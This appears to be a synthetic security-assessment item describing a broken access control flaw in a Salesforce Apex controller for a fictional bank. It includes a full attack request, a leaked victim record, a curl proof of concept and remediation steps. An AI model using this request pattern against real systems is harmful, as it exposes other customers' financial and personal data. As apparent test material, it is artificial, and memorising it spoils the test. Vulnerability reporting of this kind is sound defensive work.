# Security Analysis Report
**System:** NexaBank Open Finance API (Salesforce-Integrated)
**Domain:** Financial Services / Retail Banking
**Example ID:** SF-0052
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.1 | Functional pivot on `EventController.updateEvent` — attacker reads any financial Event record via read-disguised-as-write endpoint |

---

## Finding 1 — BAC: Functional Pivot on Event Object (Pattern 2.1)

### Summary
The Apex controller `EventController` on NexaBank Open Finance API (`968adc38.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Event object. Per §5.0 Pattern 2.1, the descriptor `c.EventController.updateEvent` functions as a functional pivot — a named "update" action is invoked as a read. The attacker substitutes `eventId` to retrieve any victim's financial Event record including `SensitiveData__c` and `InternalNotes__c`.

**Context.txt inconsistency (documented):** The Apex method definition in §4.0 is named `getEventDetails(String eventId, ...)` while the Aura descriptor in §6.0 is `c.EventController.updateEvent`. These names conflict. The HAR (§6.0) — the primary evidence artifact — uses `c.EventController.updateEvent` and `eventId`. This analysis follows the HAR evidence.

**Pattern:** 2.1 — Functional pivot, vertical/horizontal (BAC)
**Affected controller:** `c.EventController.updateEvent`
**Affected endpoint:** `POST https://968adc38.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://968adc38.lightning.force.com/aura
Authorization: Bearer 00D968ADC38!AR968adc38...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D968ADC38!AR968adc38...

message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN",
"params":{"eventId":"001DC38","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Event Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001DC38", "Name": "Victim Event Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-90-1777"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D968ADC38!AR968adc38..."
curl -s -X POST "https://968adc38.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"001DC38","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-90-1777
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class EventController { ... }`
2. `WHERE Id = :eventId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
4. Rename/restrict `updateEvent` to only perform write operations; do not allow read pivots.
